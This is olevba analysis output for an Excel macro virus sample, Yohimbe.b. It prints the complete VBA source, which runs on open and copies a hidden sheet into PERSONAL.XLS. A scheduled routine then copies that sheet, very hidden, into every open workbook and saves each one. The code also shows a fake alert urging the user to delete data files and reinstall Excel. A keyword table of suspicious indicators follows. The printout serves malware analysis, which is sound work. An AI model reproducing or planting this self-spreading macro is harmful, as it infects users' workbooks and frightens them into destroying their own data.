olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Yohimbe.b-6d5d04119875a8f2e02dc15b459e9879ec7951c4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO exec.bas 
in file: Virus.MSExcel.Yohimbe.b-6d5d04119875a8f2e02dc15b459e9879ec7951c4 - OLE stream: '_VBA_PROJECT_CUR/VBA/exec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo FixIt
    Dim SaveBook As String
    SaveBook = ActiveWorkbook.Name
    Application.ScreenUpdating = False
    Windows("PERSONAL.XLS").Visible = True
    If SheetExists("Exec") Then
    Windows("PERSONAL.XLS").Visible = False
    GoTo AlreadyInfected
    Else
    Workbooks(SaveBook).Activate
    Sheets("Exec").Select
    Sheets("Exec").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
    Workbooks("PERSONAL.XLS").Activate
    ActiveWindow.SelectedSheets.Visible = False
    Workbooks("PERSONAL.XLS").Sheets(2).Select
    ActiveWindow.Visible = False
    Workbooks("PERSONAL.XLS").Save
AlreadyInfected:
    Workbooks(SaveBook).Activate
    If SheetExists("Exec") Then
    End
    End If
    Workbooks("PERSONAL.XLS").Sheets("Exec").Copy Before:=Workbooks(SaveBook).Sheets(1)
    Sheets("Exec").Select
    ActiveWindow.SelectedSheets.Visible = False
    Workbooks(SaveBook).Sheets(2).Select
    End If
    GoTo OhKay
FixIt:
    Workbooks(SaveBook).Activate
    End
OhKay:
    Application.OnTime EarliestTime:=TimeValue("4:00 PM"), Procedure:="DipDing"
    MsgBox "You have been infected with the Laurie Virus. Delete all data files and reinstall Excel.", , "Alert"
End Sub

Sub DipDing()
Attribute DipDing.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    Dim book As Workbook
    For Each book In Workbooks
    Windows("PERSONAL.XLS").Visible = True
    Windows("PERSONAL.XLS").Activate
    Sheets("Exec").Visible = True
    Sheets("Exec").Copy Before:=book.Sheets(1)
    Sheets("Exec").Visible = xlVeryHidden
    Windows("PERSONAL.XLS").Visible = False
    book.Save
    Next book
End Sub

Function SheetExists(sName As String) As Boolean
Attribute SheetExists.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim aSheet As Object
    SheetExists = False
    For Each aSheet In ActiveWorkbook.Sheets
        If (StrComp(aSheet.Name, sName, 1) = 0) Then
        SheetExists = True
        End If
    Next aSheet
End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  exe
' 0085     20 BOUNDSHEET : Sheet Information - chart, visible -  MS Excel 4.
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

